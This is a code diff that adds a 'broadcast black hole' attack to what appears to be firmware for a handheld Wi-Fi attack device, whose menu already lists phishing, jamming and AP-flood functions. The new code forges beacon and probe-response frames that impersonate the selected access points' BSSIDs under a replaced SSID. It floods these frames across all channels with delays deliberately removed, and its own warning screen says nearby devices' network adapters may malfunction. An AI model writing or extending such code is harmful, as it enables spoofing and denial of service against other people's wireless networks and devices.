@@ -146,6 +146,7 @@ void homeActionAttackMenu();
 void homeActionQuickScan();
 void homeActionPhishing();
 void homeActionConnInterfere();
+void homeActionBeaconTamper();
 void homeActionApFlood();
 void homeActionAttackDetect();
 void homeActionPacketMonitor();
@@ -318,6 +319,7 @@ static const HomeMenuItem g_homeMenuItems[] = {
   {"快速扫描[Scan]",         homeActionQuickScan},
   {"密码钓鱼[Phishing]",     homeActionPhishing},
   {"连接/信道干扰[CI]",      homeActionConnInterfere},
+  {"广播黑洞[BBH]",           homeActionBeaconTamper},
   {"AP洪水攻击[Dos]",        homeActionApFlood},
   {"攻击帧检测[Detect]",     homeActionAttackDetect},
   {"监视器[Monitor]",        homeActionPacketMonitor},
@@ -4781,6 +4783,32 @@ void drawLinkJammerStatusPage(const String& ssid, bool clearDisplay = true) {
   }
 }
 
+// 复用函数：绘制信标广播篡改状态页面
+void drawBeaconTamperStatusPage(const String& status, bool clearDisplay = true) {
+  if (clearDisplay) {
+    display.clearDisplay();
+  }
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  
+  // 标题行
+  oledDrawCenteredLine("[广播黑洞运行中]", 18);
+  
+  // 状态行
+  oledDrawCenteredLine(status.c_str(), 32);
+  
+  // 底部提示行
+  const char* bottomHint = "吞噬目标AP信标数据";
+  int hintWidth = u8g2_for_adafruit_gfx.getUTF8Width(bottomHint);
+  int hintX = (display.width() - hintWidth) / 2;
+  u8g2_for_adafruit_gfx.setCursor(hintX, 46);
+  u8g2_for_adafruit_gfx.print(bottomHint);
+  
+  if (clearDisplay) {
+    display.display();
+  }
+}
+
 // ===== 请求发送：高效认证/关联请求泛洪 =====
 void drawRequestFloodStatus(const String& ssid, bool clearDisplay = true) {
   if (clearDisplay) {
@@ -4948,6 +4976,111 @@ void LinkJammer() {
           // 取消则继续攻击，重新启动LED和显示
           startAttackLED();
           drawLinkJammerStatusPage(displaySSID);
+        }
+      }
+      
+      wext_set_channel(WLAN0_NAME, ch);
+      
+      // 对每个目标发送帧，按信道分组优化效率
+      for (const auto& target : targets) {
+        // 大幅提高突发发送速率，最大化攻击效果
+        for (int i = 0; i < 25; i++) {
+          wifi_tx_raw_frame((void*)&target.bf, target.blen);
+        }
+        for (int i = 0; i < 30; i++) {
+          wifi_tx_raw_frame((void*)&target.prf, target.prlen);
+        }
+        // 移除目标间延时，提高攻击效率
+      }
+      // 移除信道间延时，实现最高攻击速率
+    }
+  }
+}
+
+void BeaconTamper() {
+  if (SelectedVector.empty()) {
+    showModalMessage("请先选择AP/SSID");
+    return;
+  }
+
+  // 多选目标时显示第一个目标的SSID，但攻击所有选中的目标
+  String displaySSID = scan_results[SelectedVector[0]].ssid;
+  if (SelectedVector.size() > 1) {
+    displaySSID = "多目标吞噬中";
+  }
+
+  // 使用复用函数绘制初始状态页面
+  drawBeaconTamperStatusPage(displaySSID);
+  
+  // LED提示
+  startAttackLED();
+
+  // 预构建所有目标的帧缓冲
+  struct TargetFrame {
+    String ssid;
+    const uint8_t* bssid;
+    int channel;
+    BeaconFrame bf;
+    size_t blen;
+    ProbeRespFrame prf;
+    size_t prlen;
+  };
+  
+  std::vector<TargetFrame> targets;
+  targets.reserve(SelectedVector.size());
+  
+  // 处理选中的AP
+  for (int selectedIndex : SelectedVector) {
+    if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
+      TargetFrame target;
+      target.ssid = "[已吞噬喵~]";  // 完全替换SSID
+      target.bssid = scan_results[selectedIndex].bssid;
+      target.channel = scan_results[selectedIndex].channel;
+      
+      // 预构建帧缓冲
+      uint8_t tempMac[6];
+      memcpy(tempMac, target.bssid, 6);
+      target.blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.bf);
+      target.prlen = wifi_build_probe_resp_frame(tempMac, (void*)BROADCAST_MAC, target.ssid.c_str(), target.prf);
+      
+      targets.push_back(target);
+    }
+  }
+
+  // 目标信道列表：全表
+  std::vector<int> channels;
+  channels.reserve(sizeof(allChannels)/sizeof(allChannels[0]));
+  for (int ch : allChannels) channels.push_back(ch);
+
+  while (true) {
+    // 停止条件：OK/BACK 任意键 -> 确认
+    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
+      digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
+      delay(200);
+      // 稳定按键状态，为确认弹窗做准备
+      stabilizeButtonState();
+      if (showConfirmModal("停止广播黑洞")) {
+        break;
+      } else {
+        // 取消则继续攻击，重新启动LED和显示
+        startAttackLED();
+        drawBeaconTamperStatusPage(displaySSID);
+      }
+    }
+
+    for (int ch : channels) {
+      // 在每个信道处理前检查按键状态
+      if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
+        digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
+        delay(200);
+        // 稳定按键状态，为确认弹窗做准备
+        stabilizeButtonState();
+        if (showConfirmModal("停止广播黑洞")) {
+          return; // 直接返回，退出整个函数
+        } else {
+          // 取消则继续攻击，重新启动LED和显示
+          startAttackLED();
+          drawBeaconTamperStatusPage(displaySSID);
         }
       }
       
@@ -8478,6 +8611,140 @@ bool showLinkJammerInfoPage() {
   }
 }
 
+// 显示信标广播篡改功能说明页面
+bool showBeaconTamperInfoPage() {
+  // 添加去抖变量
+  unsigned long lastBackTime = 0;
+  unsigned long lastOkTime = 0;
+  
+  while (true) {
+    unsigned long currentTime = millis();
+    
+    // 处理返回键
+    if (digitalRead(BTN_BACK) == LOW) {
+      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
+      // 等待按键释放
+      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+      delay(200); // 额外消抖时间
+      return false; // 返回首页
+    }
+    
+    // 处理确认键
+    if (digitalRead(BTN_OK) == LOW) {
+      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
+      // 等待按键释放
+      while (digitalRead(BTN_OK) == LOW) { delay(10); }
+      delay(200); // 额外消抖时间
+      return true; // 继续执行信标篡改
+    }
+    
+    // 绘制说明页面
+    display.clearDisplay();
+    display.setTextSize(1);
+    
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    
+    // 前三行显示说明文字（居中）
+    const char* line1 = "尝试吞噬已选目标AP";
+    const char* line2 = "发送的信标帧数据";
+    const char* line3 = "具体效果不可控";
+    
+    // 计算每行文字宽度并居中
+    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
+    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
+    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
+    
+    int x1 = (display.width() - w1) / 2;
+    int x2 = (display.width() - w2) / 2;
+    int x3 = (display.width() - w3) / 2;
+    
+    u8g2_for_adafruit_gfx.setCursor(x1, 15);
+    u8g2_for_adafruit_gfx.print(line1);
+    u8g2_for_adafruit_gfx.setCursor(x2, 30);
+    u8g2_for_adafruit_gfx.print(line2);
+    u8g2_for_adafruit_gfx.setCursor(x3, 45);
+    u8g2_for_adafruit_gfx.print(line3);
+    
+    // 第四行显示操作按钮
+    u8g2_for_adafruit_gfx.setCursor(5, 60);
+    u8g2_for_adafruit_gfx.print("《 返回");
+    u8g2_for_adafruit_gfx.setCursor(85, 60);
+    u8g2_for_adafruit_gfx.print("继续 》");
+    
+    display.display();
+    
+    delay(10); // 短暂延时避免CPU占用过高
+  }
+}
+
+// 显示广播黑洞警告页面
+bool showBeaconTamperWarningPage() {
+  // 添加去抖变量
+  unsigned long lastBackTime = 0;
+  unsigned long lastOkTime = 0;
+  
+  while (true) {
+    unsigned long currentTime = millis();
+    
+    // 处理返回键
+    if (digitalRead(BTN_BACK) == LOW) {
+      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
+      // 等待按键释放
+      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+      delay(200); // 额外消抖时间
+      return false; // 返回首页
+    }
+    
+    // 处理确认键
+    if (digitalRead(BTN_OK) == LOW) {
+      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
+      // 等待按键释放
+      while (digitalRead(BTN_OK) == LOW) { delay(10); }
+      delay(200); // 额外消抖时间
+      return true; // 继续执行广播黑洞
+    }
+    
+    // 绘制警告页面
+    display.clearDisplay();
+    display.setTextSize(1);
+    
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    
+    // 前三行显示警告文字（居中）
+    const char* line1 = "此功能可能会导致";
+    const char* line2 = "附近部分设备网卡异常";
+    const char* line3 = "请谨慎使用！";
+    
+    // 计算每行文字宽度并居中
+    int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
+    int w2 = u8g2_for_adafruit_gfx.getUTF8Width(line2);
+    int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3);
+    
+    int x1 = (display.width() - w1) / 2;
+    int x2 = (display.width() - w2) / 2;
+    int x3 = (display.width() - w3) / 2;
+    
+    u8g2_for_adafruit_gfx.setCursor(x1, 15);
+    u8g2_for_adafruit_gfx.print(line1);
+    u8g2_for_adafruit_gfx.setCursor(x2, 30);
+    u8g2_for_adafruit_gfx.print(line2);
+    u8g2_for_adafruit_gfx.setCursor(x3, 45);
+    u8g2_for_adafruit_gfx.print(line3);
+    
+    // 第四行显示操作按钮
+    u8g2_for_adafruit_gfx.setCursor(5, 60);
+    u8g2_for_adafruit_gfx.print("《 返回");
+    u8g2_for_adafruit_gfx.setCursor(85, 60);
+    u8g2_for_adafruit_gfx.print("继续 》");
+    
+    display.display();
+    
+    delay(10); // 短暂延时避免CPU占用过高
+  }
+}
+
 // ============ 统一菜单动作函数实现 ============
 // 所有首页菜单项的动作函数在此实现
 
@@ -8554,6 +8821,31 @@ void homeActionConnInterfere() {
     } else {
       if (showConfirmModal("启动连接干扰")) {
         LinkJammer();
+      }
+    }
+  }
+}
+
+void homeActionBeaconTamper() {
+  // 广播黑洞
+  if (SelectedVector.empty()) { 
+    showModalMessage("请先选择AP/SSID"); 
+    return; 
+  }
+  // 显示广播黑洞说明页面
+  if (showBeaconTamperInfoPage()) {
+    // 显示警告页面
+    if (showBeaconTamperWarningPage()) {
+      stabilizeButtonState();
+      // 多选目标时显示确认弹窗
+      if (SelectedVector.size() > 3) {
+        if (showConfirmModal("目标过多可能影响效果", "《 返回", "继续 》")) {
+          BeaconTamper();
+        }
+      } else {
+        if (showConfirmModal("启动广播黑洞")) {
+          BeaconTamper();
+        }
       }
     }
   }
